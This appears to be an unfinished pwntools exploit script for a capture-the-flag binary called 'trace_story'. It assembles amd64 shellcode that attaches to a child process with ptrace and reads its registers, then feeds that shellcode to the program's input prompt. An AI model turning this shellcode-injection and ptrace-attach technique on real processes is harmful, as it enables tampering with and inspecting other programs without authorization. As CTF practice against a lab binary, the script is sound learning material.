from pwn import *

io = process("./trace_story")
childPid = int(io.recvline()[19:-1])

# TODO: Is there a way so that arch="amd64" doesnt need to be typed out everytime?
# write a function for generating ptrace asm code?

# ptrace(PTRACE_ATTACH,childPid,0,0)
ownAsm  = asm("mov rax, SYS_ptrace",arch="amd64")
ownAsm += asm("mov rdi, 0x10",arch="amd64")
ownAsm += asm("mov rsi, " + hex(childPid),arch="amd64")
ownAsm += asm("mov rdx, 0",arch="amd64")
ownAsm += asm("mov r10, 0",arch="amd64")
ownAsm += asm("syscall",arch="amd64")

# ptrace(PTRACE_PEEKUSER,childPid,44,0)
ownAsm += asm("mov rax, SYS_ptrace",arch="amd64")
ownAsm += asm("mov rdi, 0x3",arch="amd64")
ownAsm += asm("mov rsi, " + hex(childPid),arch="amd64")
ownAsm += asm("mov rdx, 0x2c",arch="amd64")
ownAsm += asm("mov r10, 0",arch="amd64")
ownAsm += asm("syscall",arch="amd64")

pause()
io.sendlineafter("Input:",ownAsm)
pause()
#io.interactive()
